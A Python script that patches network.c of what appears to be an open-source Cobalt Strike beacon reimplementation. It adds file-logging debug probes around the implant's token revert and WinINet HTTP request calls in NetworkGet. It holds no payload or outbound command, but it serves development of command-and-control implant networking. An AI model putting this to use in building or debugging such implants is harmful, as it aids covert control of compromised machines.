# -*- coding: utf-8 -*-
r"""add_net_probes_v2.py - add OBTRACE probes to network.c NetworkGet.
Uses REAL newlines (chr(10)) for code structure and \\n ONLY inside C
string literals.  This is the correct way (previous attempts used the
literal two-char sequence \n as a line separator, breaking the C source)."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\network.c")
s = io.open(P, encoding="utf-8").read()

BS = chr(92)
TAB = chr(9)
L = chr(10)  # real newline for code structure
# inside C string literals: \\n = BS+BS+n (escaped backslash + n)
C_NL = BS + BS + "n"

# 1. insert NETTRACE helper before NetworkGet
helper = (
    "static void NETTRACE(const char* what) {" + L +
    '\tFILE* f = fopen("C:' + BS*4 + 'Users' + BS*4 + 'Public' + BS*4 +
    'ob_trace.txt", "a");' + L +
    '\tif (f) { fprintf(f, "[%lu] %s' + C_NL + '", '
    '(unsigned long)GetTickCount(), what); fclose(f); }' + L +
    "}" + L + L
)
i_ng = s.index("int NetworkGet(")
s = s[:i_ng] + helper + s[i_ng:]

# 2. probe after IdentityRevertToken (first occurrence in NetworkGet)
old2 = L + TAB + "IdentityRevertToken();" + L
probe2 = (L + TAB + "IdentityRevertToken();" + L +
          TAB + '{ char tb[256]; sprintf(tb, "NETGET: gIC=0x%p gIO=0x%p", '
          '(void*)gInternetConnect, (void*)gInternetOpen); NETTRACE(tb); }' + L)
idx = s.index(old2, i_ng)
s = s[:idx] + probe2 + s[idx + len(old2):]

# 3. probe after HttpOpenRequestA (the &gContext); line)
old3 = TAB*3 + "&gContext);" + L
probe3 = (TAB*3 + "&gContext);" + L +
          TAB*2 + '{ char tb[256]; sprintf(tb, "NETGET: open=0x%p gle=%lu", '
          '(void*)hInternet, (unsigned long)GetLastError()); NETTRACE(tb); }' + L)
idx = s.index(old3, i_ng)
s = s[:idx] + probe3 + s[idx + len(old3):]

# 4. replace HttpSendRequestA with probed version
old4 = (TAB + "HttpSendRequestA(hInternet, transform.headers, "
        "strlen(transform.headers), transform.body, transform.bodyLength);" + L)
probe4 = (TAB + '{ char tb[300]; sprintf(tb, "NETGET: hdr=[%s] bodyLen=%d", '
          'transform.headers ? transform.headers : "(null)", '
          '(int)transform.bodyLength); NETTRACE(tb); }' + L +
          TAB + "BOOL sent = HttpSendRequestA(hInternet, transform.headers, "
          "strlen(transform.headers), transform.body, transform.bodyLength);" + L +
          TAB + '{ char tb[256]; sprintf(tb, "NETGET: sent=%d gle=%lu", '
          'sent, (unsigned long)GetLastError()); NETTRACE(tb); }' + L)
idx = s.index(old4, i_ng)
s = s[:idx] + probe4 + s[idx + len(old4):]


io.open(P, "w", encoding="utf-8", newline="").write(s)
print("probes added cleanly; NETTRACE count:", s.count("NETTRACE"))
